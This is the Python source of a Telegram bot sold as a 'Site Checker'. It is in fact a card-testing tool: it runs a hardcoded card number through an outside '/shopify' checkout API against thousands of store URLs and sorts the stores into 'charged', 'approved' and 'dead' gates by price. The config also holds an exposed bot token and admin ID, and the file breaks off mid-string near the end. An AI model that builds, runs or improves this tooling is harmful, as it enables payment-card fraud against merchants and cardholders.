import asyncio
import os
import json
import tempfile
import zipfile
import re
import time
import logging
import sys
from datetime import datetime
from io import BytesIO
import threading
import traceback
from urllib.parse import urlparse

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, Document, Bot
from telegram.ext import Application, CommandHandler, MessageHandler, filters, CallbackContext, CallbackQueryHandler
import aiohttp
import aiofiles

# =================================================================================
# CONFIGURATION - UPDATE THESE VALUES
# =================================================================================

# Get bot token from environment variable or set directly
BOT_TOKEN = os.environ.get('BOT_TOKEN', '8506637173:AAE3VwPm7DLVMzEsubB5ar2TGzRdB6F5jeE')

# Admin IDs (comma-separated in environment or list here)
ADMIN_IDS = [int(id) for id in os.environ.get('ADMIN_IDS', '6117145442').split(',') if id]

# Checker Configuration
CONFIG = {
    'max_sites': 10000,           # Maximum sites to check per request
    'batch_size': 30,             # Number of sites to check in parallel
    'timeout': 60,                # Timeout per site check (seconds)
    'test_card': '4031630422575208|01|2030|280',  # Test card for checking
    'api_url': 'https://youhknowcrimson-busycrimson.up.railway.app/shopify',  # API endpoint
}

# =================================================================================
# PRICE CATEGORIES - Customize as needed
# =================================================================================

PRICE_CATEGORIES = {
    '0_FREE': {'min': 0, 'max': 0, 'label': 'FREE', 'emoji': '🆓'},
    '0_to_5': {'min': 0.01, 'max': 5, 'label': '$0-5', 'emoji': '💰'},
    '5_to_10': {'min': 5, 'max': 10, 'label': '$5-10', 'emoji': '💰'},
    '10_to_20': {'min': 10, 'max': 20, 'label': '$10-20', 'emoji': '💰'},
    '20_to_50': {'min': 20, 'max': 50, 'label': '$20-50', 'emoji': '💰'},
    '50_to_100': {'min': 50, 'max': 100, 'label': '$50-100', 'emoji': '💰'},
    '100_to_200': {'min': 100, 'max': 200, 'label': '$100-200', 'emoji': '💰'},
    '200_to_500': {'min': 200, 'max': 500, 'label': '$200-500', 'emoji': '💰'},
    '500_to_1000': {'min': 500, 'max': 1000, 'label': '$500-1000', 'emoji': '💰'},
    '1000_plus': {'min': 1000, 'max': float('inf'), 'label': '$1000+', 'emoji': '💎'},
}

# =================================================================================
# STATUS EMOJIS
# =================================================================================

STATUS_EMOJIS = {
    'charged': '💎',
    'approved': '✅',
    'declined': '❌',
    'dead': '💀',
    'error': '⚠️',
    'unknown': '❓'
}

STATUS_LABELS = {
    'charged': 'CHARGED',
    'approved': 'APPROVED',
    'declined': 'DECLINED',
    'dead': 'DEAD',
    'error': 'ERROR',
    'unknown': 'UNKNOWN'
}

# =================================================================================
# LOGGING SETUP
# =================================================================================

logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# =================================================================================
# UTILITY FUNCTIONS
# =================================================================================

def is_valid_url_or_domain(url):
    """
    Check if a URL or domain is valid.
    """
    domain = url.lower().strip()
    if domain.startswith(('http://', 'https://')):
        try:
            parsed = urlparse(url)
            domain = parsed.netloc
        except:
            return False
    domain = domain.replace('www.', '')
    pattern = r'^[a-zA-Z0-9]([a-zA-Z0-9\-]*[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9\-]*[a-zA-Z0-9])?)*\.[a-zA-Z]{2,}$'
    return bool(re.match(pattern, domain))

def extract_urls_from_text(text):
    """
    Extract valid URLs/domains from text.
    Each line should contain one URL/domain.
    """
    clean_urls = set()
    lines = text.split('\n')
    for line in lines:
        # Remove common prefixes and clean
        cleaned = re.sub(r'^[\s\-\+\|,\d\.\)\(\[\]]+', '', line.strip())
        cleaned = cleaned.split(' ')[0] if cleaned else ''
        if cleaned and is_valid_url_or_domain(cleaned):
            clean_urls.add(cleaned)
    return list(clean_urls)

def parse_price(price_str):
    """
    Parse price string to float.
    Handles formats like: $10.99, 10.99 USD, 10.99
    """
    if not price_str or price_str == '-' or price_str == 'Unknown' or price_str == 'N/A':
        return None
    try:
        cleaned = price_str.replace('$', '').replace('USD', '').replace('EUR', '').replace('GBP', '').strip()
        return float(cleaned)
    except:
        return None

def get_price_category(price_value):
    """
    Get price category for a price value.
    Returns the category key.
    """
    if price_value is None:
        return None
    for category, info in PRICE_CATEGORIES.items():
        if info['min'] <= price_value <= info['max']:
            return category
    return None

def get_price_label(price_value):
    """
    Get human-readable price label.
    """
    category = get_price_category(price_value)
    if category:
        return PRICE_CATEGORIES[category]['label']
    return 'Unknown'

def get_price_emoji(price_value):
    """
    Get emoji for price category.
    """
    category = get_price_category(price_value)
    if category:
        return PRICE_CATEGORIES[category]['emoji']
    return '💰'

def is_site_dead(response_text):
    """
    Check if a site is dead based on response text.
    """
    if not response_text:
        return True
    response_lower = response_text.lower()
    dead_indicators = [
        'receipt id is empty', 'handle is empty', 'product id is empty',
        'tax amount is empty', 'payment method identifier is empty',
        'invalid url', 'error in 1st req', 'error in 1 req',
        'cloudflare', 'connection failed', 'timed out',
        'access denied', 'tlsv1 alert', 'ssl routines',
        'could not resolve', 'domain name not found',
        'name or service not known', 'openssl ssl_connect',
        'empty reply from server', 'HTTPERROR504', 'http error',
        'httperror504', 'timeout', 'unreachable', 'ssl error',
        '502', '503', '504', 'bad gateway', 'service unavailable',
        'gateway timeout', 'network error', 'connection reset',
        'failed to detect product', 'failed to create checkout',
        'failed to tokenize card', 'failed to get proposal data',
        'submit rejected', 'handle error', 'http 404',
        'url rejected', 'malformed input', 'amount_too_small',
        'SITE DEAD', 'site dead', 'CAPTCHA_REQUIRED',
        'captcha_required', 'captcha required', 'Site errors',
        'Site errors: Failed to tokenize card', 'Failed'
    ]
    return any(indicator in response_lower for indicator in dead_indicators)

def is_charged(response_text):
    """
    Check if site returned CHARGED status.
    """
    if not response_text:
        return False
    response_lower = response_text.lower()
    charged_indicators = [
        'charged', 'order completed', 'thank you',
        'payment successful', '💎', 'Order completed',
        'complete', 'successfully charged'
    ]
    return any(indicator in response_lower for indicator in charged_indicators)

def is_approved(response_text):
    """
    Check if site returned APPROVED status.
    """
    if not response_text:
        return False
    response_lower = response_text.lower()
    approved_indicators = [
        'invalid_cvv', 'incorrect_cvv', 'insufficient_funds',
        'approved', 'success', 'invalid_cvc', 'incorrect_cvc',
        'incorrect_zip', 'insufficient funds', 'cvv', 'cvc',
        'approval', 'successful'
    ]
    return any(indicator in response_lower for indicator in approved_indicators)

def determine_status(response_text):
    """
    Determine the status of a site based on response.
    Returns: 'charged', 'approved', 'declined', 'dead'
    """
    if is_site_dead(response_text):
        return 'dead'
    elif is_charged(response_text):
        return 'charged'
    elif is_approved(response_text):
        return 'approved'
    else:
        return 'declined'

def format_file_size(size_bytes):
    """
    Format file size in human-readable format.
    """
    for unit in ['B', 'KB', 'MB', 'GB']:
        if size_bytes < 1024.0:
            return f"{size_bytes:.1f} {unit}"
        size_bytes /= 1024.0
    return f"{size_bytes:.1f} TB"

def create_progress_bar(current, total, width=20):
    """
    Create a text-based progress bar.
    """
    if total == 0:
        return '[' + '░' * width + ']'
    progress = min(current / total, 1.0)
    filled = int(width * progress)
    bar = '█' * filled + '░' * (width - filled)
    return f'[{bar}] {int(progress * 100)}%'

# =================================================================================
# SITE CHECKER CLASS
# =================================================================================

class SiteChecker:
    """
    Main class for checking sites and organizing results by price.
    """
    
    def __init__(self, config=None):
        self.config = config or CONFIG
        self.results = {
            'charged': [],
            'approved': [],
            'declined': [],
            'dead': [],
            'error': [],
            'by_price': {},
            'all': []
        }
        self.stats = {
            'total': 0,
            'checked': 0,
            'charged': 0,
            'approved': 0,
            'declined': 0,
            'dead': 0,
            'error': 0,
            'by_price': {}
        }
        # Initialize price categories
        for category in PRICE_CATEGORIES:
            self.results['by_price'][category] = []
            self.stats['by_price'][category] = 0
        self.start_time = None
        self.end_time = None
        self._progress_callback = None

    async def test_single_site(self, site):
        """
        Test a single site.
        Returns site data with status and price information.
        """
        site = site.strip()
        if not site.startswith(('http://', 'https://')):
            site = f'https://{site}'
        
        try:
            # Build API URL
            url = f"{self.config['api_url']}?cc={self.config['test_card']}&url={site}"
            
            timeout = aiohttp.ClientTimeout(total=self.config['timeout'])
            async with aiohttp.ClientSession(timeout=timeout) as session:
                async with session.get(url) as response:
                    if response.status != 200:
                        return {
                            'site': site,
                            'status': 'error',
                            'response': f'HTTP {response.status}',
                            'price': '-',
                            'price_value': None,
                            'gateway': '-',
                            'price_label': 'Unknown',
                            'price_emoji': '💰'
                        }
                    
                    try:
                        data = await response.json()
                    except:
                        text = await response.text()
                        return {
                            'site': site,
                            'status': 'error',
                            'response': 'Invalid JSON response',
                            'price': '-',
                            'price_value': None,
                            'gateway': '-',
                            'price_label': 'Unknown',
                            'price_emoji': '💰'
                        }
                    
                    # Extract data
                    response_text = data.get('Response', '')
                    price = data.get('Price', '-')
                    gateway = data.get('Gate', 'Shopify')
                    price_value = parse_price(price)
                    
                    # Determine status
                    status = determine_status(response_text)
                    
                    # Get price info
                    price_label = get_price_label(price_value) if price_value else 'Unknown'
                    price_emoji = get_price_emoji(price_value) if price_value else '💰'
                    
                    return {
                        'site': site,
                        'status': status,
                        'response': response_text[:200] if response_text else 'No response',
                        'price': price,
                        'price_value': price_value,
                        'gateway': gateway,
                        'price_label': price_label,
                        'price_emoji': price_emoji
                    }
                    
        except asyncio.TimeoutError:
            return {
                'site': site,
                'status': 'error',
                'response': 'Timeout - Site took too long to respond',
                'price': '-',
                'price_value': None,
                'gateway': '-',
                'price_label': 'Unknown',
                'price_emoji': '💰'
            }
        except Exception as e:
            return {
                'site': site,
                'status': 'error',
                'response': str(e)[:100],
                'price': '-',
                'price_value': None,
                'gateway': '-',
                'price_label': 'Unknown',
                'price_emoji': '💰'
            }

    async def check_sites(self, sites, progress_callback=None):
        """
        Check multiple sites in batches.
        """
        self.start_time = time.time()
        self.stats['total'] = len(sites)
        self._progress_callback = progress_callback
        
        # Limit sites
        if len(sites) > self.config['max_sites']:
            sites = sites[:self.config['max_sites']]
            logger.info(f"Limited to {self.config['max_sites']} sites")
        
        logger.info(f"Starting check for {len(sites)} sites")
        
        # Process in batches
        for i in range(0, len(sites), self.config['batch_size']):
            batch = sites[i:i + self.config['batch_size']]
            tasks = [self.test_single_site(site) for site in batch]
            results = await asyncio.gather(*tasks, return_exceptions=True)
            
            for result in results:
                self.stats['checked'] += 1
                
                if isinstance(result, Exception):
                    result = {
                        'site': 'unknown',
                        'status': 'error',
                        'response': str(result),
                        'price': '-',
                        'price_value': None,
                        'gateway': '-',
                        'price_label': 'Unknown',
                        'price_emoji': '💰'
                    }
                
                # Create site data
                site_data = {
                    'site': result.get('site', 'unknown'),
                    'status': result.get('status', 'unknown'),
                    'response': result.get('response', ''),
                    'price': result.get('price', '-'),
                    'price_value': result.get('price_value'),
                    'gateway': result.get('gateway', '-'),
                    'price_label': result.get('price_label', 'Unknown'),
                    'price_emoji': result.get('price_emoji', '💰')
                }
                
                # Add to all results
                self.results['all'].append(site_data)
                
                # Add to status category
                status = site_data['status']
                if status in self.results:
                    self.results[status].append(site_data)
                    self.stats[status] += 1
                else:
                    self.results['unknown'].append(site_data)
                
                # Add to price category
                if site_data['price_value'] is not None:
                    category = get_price_category(site_data['price_value'])
                    if category:
                        self.results['by_price'][category].append(site_data)
                        self.stats['by_price'][category] += 1
            
            # Progress callback
            if progress_callback:
                try:
                    await progress_callback(self.stats)
                except Exception as e:
                    logger.error(f"Progress callback error: {e}")
            
            # Small delay between batches
            await asyncio.sleep(0.5)
            
            # Log progress
            if self.stats['checked'] % 100 == 0:
                logger.info(f"Progress: {self.stats['checked']}/{self.stats['total']} sites checked")
        
        self.end_time = time.time()
        logger.info(f"Check completed: {self.stats['checked']} sites in {self.get_time_taken():.2f}s")

    def get_time_taken(self):
        """Get time taken for the check in seconds."""
        if self.end_time and self.start_time:
            return self.end_time - self.start_time
        return 0

    def get_summary(self):
        """
        Get summary statistics.
        """
        return {
            'total': self.stats['checked'],
            'charged': self.stats['charged'],
            'approved': self.stats['approved'],
            'declined': self.stats['declined'],
            'dead': self.stats['dead'],
            'error': self.stats['error'],
            'by_price': dict(self.stats['by_price']),
            'time_taken': round(self.get_time_taken(), 2)
        }

    def get_price_breakdown_text(self):
        """
        Get formatted price breakdown text.
        """
        lines = []
        total_with_price = sum(self.stats['by_price'].values())
        
        if total_with_price == 0:
            return "  No price data available"
        
        # Sort categories
        sorted_categories = sorted(
            [(k, v) for k, v in self.stats['by_price'].items() if v > 0],
            key=lambda x: x[0]
        )
        
        for category, count in sorted_categories:
            label = PRICE_CATEGORIES[category]['label']
            emoji = PRICE_CATEGORIES[category]['emoji']
            percentage = (count / total_with_price) * 100
            bar = create_progress_bar(count, max(1, max(self.stats['by_price'].values())), 10)
            lines.append(f"  {emoji} {label}: {count} sites ({percentage:.1f}%) {bar}")
        
        return '\n'.join(lines)

    def save_results(self):
        """
        Save results to temporary files.
        Returns dictionary of file paths.
        """
        temp_dir = tempfile.mkdtemp()
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        files = {}
        
        summary = self.get_summary()
        total_with_price = sum(summary['by_price'].values())
        
        # =============================================
        # 1. SUMMARY FILE
        # =============================================
        summary_file = os.path.join(temp_dir, f'SUMMARY_{timestamp}.txt')
        with open(summary_file, 'w', encoding='utf-8') as f:
            f.write("=" * 80 + "\n")
            f.write(" SITE CHECKER SUMMARY REPORT\n")
            f.write("=" * 80 + "\n\n")
            f.write(f"📅 Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"⏱️  Time Taken: {summary['time_taken']} seconds\n")
            f.write(f"📍 Total Sites Checked: {summary['total']}\n\n")
            
            f.write("-" * 80 + "\n")
            f.write(" STATUS BREAKDOWN\n")
            f.write("-" * 80 + "\n\n")
            f.write(f"  💎 CHARGED:  {summary['charged']:4d} sites\n")
            f.write(f"  ✅ APPROVED: {summary['approved']:4d} sites\n")
            f.write(f"  ❌ DECLINED: {summary['declined']:4d} sites\n")
            f.write(f"  💀 DEAD:     {summary['dead']:4d} sites\n")
            f.write(f"  ⚠️ ERROR:    {summary['error']:4d} sites\n\n")
            
            f.write("-" * 80 + "\n")
            f.write(" PRICE CATEGORY BREAKDOWN\n")
            f.write("-" * 80 + "\n\n")
            
            if total_with_price > 0:
                sorted_categories = sorted(
                    [(k, v) for k, v in summary['by_price'].items() if v > 0],
                    key=lambda x: x[0]
                )
                for category, count in sorted_categories:
                    label = PRICE_CATEGORIES[category]['label']
                    emoji = PRICE_CATEGORIES[category]['emoji']
                    percentage = (count / total_with_price) * 100
                    f.write(f"  {emoji} {label}: {count:4d} sites ({percentage:5.1f}%)\n")
            else:
                f.write("  No price data available\n")
            
            f.write("\n" + "=" * 80 + "\n")
            f.write(" END OF SUMMARY\n")
            f.write("=" * 80 + "\n")
        
        files['SUMMARY.txt'] = summary_file
        
        # =============================================
        # 2. STATUS FILES
        # =============================================
        for status, sites in self.results.items():
            if status == 'all' or status == 'by_price' or not sites:
                continue
            
            status_emoji = STATUS_EMOJIS.get(status, '❓')
            status_label = STATUS_LABELS.get(status, status.upper())
            
            status_file = os.path.join(temp_dir, f'{status.upper()}_{timestamp}.txt')
            with open(status_file, 'w', encoding='utf-8') as f:
                f.write(f"{status_emoji} {status_label} SITES\n")
                f.write("=" * 80 + "\n")
                f.write(f"Total: {len(sites)} sites\n")
                f.write("=" * 80 + "\n\n")
                
                # Sort by price if available
                sites_sorted = sorted(
                    sites,
                    key=lambda x: x.get('price_value', 0) or 0,
                    reverse=True
                )
                
                for idx, site in enumerate(sites_sorted, 1):
                    price = site.get('price', '-')
                    price_label = site.get('price_label', 'Unknown')
                    price_emoji = site.get('price_emoji', '💰')
                    gateway = site.get('gateway', 'Unknown')
                    response = site.get('response', '')[:100]
                    f.write(f"{idx:4d}. {site['site']}\n")
                    f.write(f"     {price_emoji} Price: ${price} ({price_label})\n")
                    f.write(f"     🚪 Gateway: {gateway}\n")
                    f.write(f"     📝 Response: {response}\n\n")
            
            files[f'{status.upper()}.txt'] = status_file
        
        # =============================================
        # 3. PRICE CATEGORY FILES
        # =============================================
        for category, sites in self.results['by_price'].items():
            if not sites:
                continue
            
            label = PRICE_CATEGORIES[category]['label']
            emoji = PRICE_CATEGORIES[category]['emoji']
            
            price_file = os.path.join(temp_dir, f'PRICE_{category}_{timestamp}.txt')
            with open(price_file, 'w', encoding='utf-8') as f:
                f.write(f"{emoji} PRICE RANGE: {label}\n")
                f.write("=" * 80 + "\n")
                f.write(f"Total: {len(sites)} sites\n")
                f.write("=" * 80 + "\n\n")
                
                # Sort by price
                sites_sorted = sorted(
                    sites,
                    key=lambda x: x.get('price_value', 0) or 0,
                    reverse=True
                )
                
                for idx, site in enumerate(sites_sorted, 1):
                    status_emoji = STATUS_EMOJIS.get(site['status'], '❓')
                    price = site.get('price', '-')
                    gateway = site.get('gateway', 'Unknown')
                    status_label = STATUS_LABELS.get(site['status'], site['status'].upper())
                    response = site.get('response', '')[:80]
                    f.write(f"{idx:4d}. {status_emoji} {site['site']}\n")
                    f.write(f"     ${price} | {gateway} | {status_label}\n")
                    f.write(f"     {response}\n\n")
            
            files[f'PRICE_{label}.txt'] = price_file
        
        # =============================================
        # 4. ALL SITES FILE
        # =============================================
        all_file = os.path.join(temp_dir, f'ALL_SITES_{timestamp}.txt')
        with open(all_file, 'w', encoding='utf-8') as f:
            f.write("ALL CHECKED SITES\n")
            f.write("=" * 80 + "\n")
            f.write(f"Total: {len(self.results['all'])} sites\n")
            f.write("=" * 80 + "\n\n")
            
            # Sort by status and price
            status_order = {'charged': 0, 'approved': 1, 'declined': 2, 'dead': 3, 'error': 4, 'unknown': 5}
            sites_sorted = sorted(
                self.results['all'],
                key=lambda x: (status_order.get(x['status'], 99), - (x.get('price_value', 0) or 0))
            )
            
            for idx, site in enumerate(sites_sorted, 1):
                status_emoji = STATUS_EMOJIS.get(site['status'], '❓')
                status_label = STATUS_LABELS.get(site['status'], site['status'].upper())
                price = site.get('price', '-')
                price_label = site.get('price_label', 'Unknown')
                price_emoji = site.get('price_emoji', '💰')
                gateway = site.get('gateway', 'Unknown')
                response = site.get('response', '')[:80]
                f.write(f"{idx:4d}. {status_emoji} {site['site']}\n")
                f.write(f"     {price_emoji} Price: ${price} ({price_label})\n")
                f.write(f"     Status: {status_label} | Gateway: {gateway}\n")
                f.write(f"     Response: {response}\n\n")
        
        files['ALL_SITES.txt'] = all_file
        
        # =============================================
        # 5. JSON FILE
        # =============================================
        json_file = os.path.join(temp_dir, f'results_{timestamp}.json')
        with open(json_file, 'w', encoding='utf-8') as f:
            # Prepare clean data for JSON
            json_data = {
                'summary': self.get_summary(),
                'results': {
                    'charged': self.results['charged'],
                    'approved': self.results['approved'],
                    'declined': self.results['declined'],
                    'dead': self.results['dead'],
                    'error': self.results['error'],
                    'by_price': dict(self.results['by_price']),
                    'all': self.results['all']
                }
            }
            json.dump(json_data, f, indent=2, default=str)
        
        files['results.json'] = json_file
        
        return files

# =================================================================================
# USER SESSIONS
# =================================================================================

user_sessions = {}

class UserSession:
    """
    Store user session data.
    """
    def __init__(self, user_id):
        self.user_id = user_id
        self.sites = []
        self.status = 'idle'  # idle, checking, done, error
        self.results = None
        self.files = {}
        self.error_msg = None
        self.progress = {'checked': 0, 'total': 0}
        self.start_time = None
        self.end_time = None
        self.checker = None
        self.message_id = None
        self.chat_id = None

# =================================================================================
# TELEGRAM BOT HANDLERS
# =================================================================================

async def start(update: Update, context: CallbackContext):
    """
    /start command - Welcome message
    """
    user = update.effective_user
    welcome = f"""
🚀 **Welcome to Site Checker Bot, {user.first_name}!**

I check websites and automatically organize them by price range.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

**📋 Price Categories:**
🆓 FREE | 💰 $0-5 | 💰 $5-10 | 💰 $10-20 | 💰 $20-50
💰 $50-100 | 💰 $100-200 | 💰 $200-500 | 💰 $500-1000 | 💎 $1000+

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

**📝 Commands:**
/start - Show this message
/help - Detailed help
/check - Start checking sites
/stats - Bot statistics
/about - About this bot

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

**🎯 How to use:**
1. Send me sites (one per line)
2. Or send a .txt file
3. I'll check and organize by price

**Ready?** Send your sites now! 🚀
"""
    keyboard = [
        [InlineKeyboardButton("🔍 Check Sites", callback_data='check')],
        [InlineKeyboardButton("📊 Stats", callback_data='stats')],
        [InlineKeyboardButton("❓ Help", callback_data='help')],
        [InlineKeyboardButton("ℹ️ About", callback_data='about')]
    ]
    await update.message.reply_text(
        welcome,
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='Markdown'
    )

async def help_command(update: Update, context: CallbackContext):
    """
    /help command - Detailed help
    """
    help_text = """
📖 **Site Checker Bot - Help Guide**

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

**📥 How to send sites:**

**Option 1: Text Message**
Send a message with sites, one per line:

**Option 2: File Upload**
Send a .txt file containing sites (one per line)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

**📊 What you get:**

| File | Description |
|------|-------------|
| SUMMARY.txt | Complete statistics |
| CHARGED.txt | 💎 Charged sites |
| APPROVED.txt | ✅ Approved sites |
| DECLINED.txt | ❌ Declined sites |
| PRICE_*.txt | Sites by price range |
| ALL_SITES.txt | Complete list |

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

**⚠️ Limits:**
- Max 10,000 sites per check
- Max file size: 10MB
- Each site checked with test card

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

**💰 Price Categories:**
{chr(10).join([f"  {info['emoji']} {info['label']}" for info in PRICE_CATEGORIES.values()])}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

**💡 Tips:**
- Use clean URLs without http://
- Remove www. for cleaner results
- Check 100+ sites for best results

**Support:** @FROXT_07
"""
    await update.message.reply_text(help_text, parse_mode='Markdown')

async def about_command(update: Update, context: CallbackContext):
    """
    /about command - About the bot
    """
    about_text = """
🤖 **Site Checker Bot v3.0**

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

**✨ Features:**
✅ Check multiple sites
✅ Auto-filter by price range
✅ Organize by status
✅ Export as files
✅ Batch processing
✅ Real-time progress

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

**🛠️ Technology:**
- Python 3.10
- Aiohttp (async requests)
- Telegram Bot API
- JSON for data

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

**📊 Capabilities:**
- 10,000 sites per check
- 20 sites in parallel
- 90 second timeout
- Price filtering

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

**👨‍💻 Developer:** @FROXT_07
**📅 Version:** 3.0
**📝 License:** MIT

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

*Made with ❤️ for the community*
"""
    await update.message.reply_text(about_text, parse_mode='Markdown')

async def stats_command(update: Update, context: CallbackContext):
    """
    /stats command - Show bot statistics
    """
    stats_text = """
📊 **Bot Statistics**

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

**⚙️ Configuration:**
- Max Sites: 10,000
- Batch Size: 20
- Timeout: 90 seconds
- API: Active

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

**💰 Price Categories:**
"""
    for category, info in PRICE_CATEGORIES.items():
        stats_text += f"\n  {info['emoji']} {info['label']}"
    
    stats_text += """

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

**📈 Status:**
- 🟢 Online
- ⚡ Ready to check

**📞 Support:** @FROXT_07
"""
    await update.message.reply_text(stats_text, parse_mode='Markdown')

async def check_command(update: Update, context: CallbackContext):
    """
    /check command - Instructions for checking
    """
    text = """
🔍 **Ready to Check Sites!**

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

**Send your sites in one of these ways:**

**1️⃣ Text Message**
Send a message with sites (one per line):

**2️⃣ File Upload**
Send a .txt file with sites

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

**⚠️ Important:**
- Each site on a new line
- Max 10,000 sites
- .txt files only

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

**📊 You'll receive:**
- Organized files by price
- Status breakdown
- Complete summary

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

**🚀 Send your sites now!**
"""
    await update.message.reply_text(text, parse_mode='Markdown')

async def handle_text(update: Update, context: CallbackContext):
    """
    Handle text messages with sites
    """
    user_id = update.effective_user.id
    text = update.message.text
    
    # Skip commands
    if text.startswith('/'):
        return
    
    # Skip if already checking
    if user_id in user_sessions and user_sessions[user_id].status == 'checking':
        await update.message.reply_text("⏳ You have a check in progress! Please wait.")
        return
    
    # Extract sites
    sites = extract_urls_from_text(text)
    
    if not sites:
        await update.message.reply_text(
            "❌ No valid sites found!\n\n"
            "Please send sites one per line:\n"
            "```\nhttps://example.com\nhttps://shopify-store.com\n```",
            parse_mode='Markdown'
        )
        return
    
    if len(sites) > 10000:
        await update.message.reply_text(f"⚠️ Too many sites ({len(sites)}). Maximum is 10,000.")
        return
    
    # Start checking
    await start_checking(update, context, sites)

async def handle_document(update: Update, context: CallbackContext):
    """
    Handle document (file) uploads
    """
    user_id = update.effective_user.id
    document = update.message.document
    
    # Check if already checking
    if user_id in user_sessions and user_sessions[user_id].status == 'checking':
        await update.message.reply_text("⏳ You have a check in progress! Please wait.")
        return
    
    # Check file type
    if not document.file_name.endswith('.txt'):
        await update.message.reply_text("❌ Please send a .txt file!")
        return
    
    # Check file size (max 10MB)
    if document.file_size > 10 * 1024 * 1024:
        await update.message.reply_text("❌ File too large! Max 10MB.")
        return
    
    # Download file
    status_msg = await update.message.reply_text("📥 Downloading file...")
    
    try:
        file = await context.bot.get_file(document.file_id)
        file_path = f"/tmp/{user_id}_{document.file_name}"
        await file.download_to_drive(file_path)
        
        # Read sites
        with open(file_path, 'r', encoding='utf-8') as f:
            content = f.read()
        os.remove(file_path)
        
        sites = extract_urls_from_text(content)
        
        if not sites:
            await status_msg.edit_text("❌ No valid sites found in file!")
            return
        
        if len(sites) > 10000:
            await status_msg.edit_text(f"⚠️ Too many sites ({len(sites)}). Max 10,000.")
            return
        
        await status_msg.delete()
        await start_checking(update, context, sites)
        
    except Exception as e:
        await status_msg.edit_text(f"❌ Error processing file: {e}")
        logger.error(f"File processing error: {e}\n{traceback.format_exc()}")

async def start_checking(update: Update, context: CallbackContext, sites):
    """
    Start the site checking process
    """
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id
    
    # Create session
    session = UserSession(user_id)
    session.sites = sites
    session.status = 'checking'
    session.start_time = datetime.now()
    session.chat_id = chat_id
    user_sessions[user_id] = session
    
    # Send initial message
    status_msg = await update.message.reply_text(
        f"🔍 **Checking {len(sites)} sites...**\n\n"
        f"⏳ This may take a few minutes...\n"
        f"📊 Progress: 0/{len(sites)} (0%)\n\n"
        f"🔄 Please wait...",
        parse_mode='Markdown'
    )
    session.message_id = status_msg.message_id
    
    # Run checker in background
    def run_checker():
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        
        try:
            # Create checker
            checker = SiteChecker(CONFIG)
            session.checker = checker
            
            # Define progress callback
            async def progress_callback(stats):
                try:
                    # Update status message
                    progress = stats['checked']
                    total = stats['total']
                    charged = stats['charged']
                    approved = stats['approved']
                    
                    bar = create_progress_bar(progress, total)
                    progress_text = f"{bar} {progress}/{total} ({int(progress/total*100 if total > 0 else 0)}%)"
                    
                    # Get emoji for current status
                    status_emoji = '🔍' if progress < total else '✅'
                    
                    edit_text = (
                        f"{status_emoji} **Checking sites...**\n\n"
                        f"📊 Progress: {progress_text}\n"
                        f"💎 Charged: {charged}\n"
                        f"✅ Approved: {approved}\n\n"
                        f"⏳ Processing... Please wait"
                    )
                    
                    await context.bot.edit_message_text(
                        chat_id=chat_id,
                        message_id=session.message_id,
                        text=edit_text,
                        parse_mode='Markdown'
                    )
                except Exception as e:
                    logger.error(f"Progress update error: {e}")
            
            # Run check
            loop.run_until_complete(checker.check_sites(sites, progress_callback))
            
            # Save results
            files = checker.save_results()
            session.files = files
            session.results = checker.get_summary()
            session.status = 'done'
            session.end_time = datetime.now()
            
            logger.info(f"User {user_id}: Check completed. Results: {session.results}")
            
        except Exception as e:
            logger.error(f"Checker error for user {user_id}: {e}\n{traceback.format_exc()}")
            session.status = 'error'
            session.error_msg = str(e)
    
    # Start in thread
    thread = threading.Thread(target=run_checker)
    thread.daemon = True
    thread.start()
    
    # Wait for completion and send results
    await asyncio.sleep(2)
    await send_results(update, context, status_msg, session)

async def send_results(update: Update, context: CallbackContext, status_msg, session):
    """
    Send results to user
    """
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id
    
    # Wait for completion (check every 2 seconds)
    timeout = 600  # 10 minutes
    waited = 0
    
    while session.status == 'checking' and waited < timeout:
        await asyncio.sleep(2)
        waited += 2
    
    if session.status == 'error':
        await status_msg.edit_text(
            f"❌ **Error during check!**\n\n"
            f"```\n{session.error_msg}\n```\n\n"
            f"Please try again or contact support.",
            parse_mode='Markdown'
        )
        return
    
    if session.status != 'done':
        await status_msg.edit_text(
            "⏰ **Timeout!**\n\n"
            "The check took too long. Please try again with fewer sites.",
            parse_mode='Markdown'
        )
        return
    
    # Get results
    results = session.results
    time_taken = (session.end_time - session.start_time).total_seconds()
    
    # =============================================
    # 1. Send Summary Message
    # =============================================
    summary_text = f"""
✅ **Check Complete!**

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

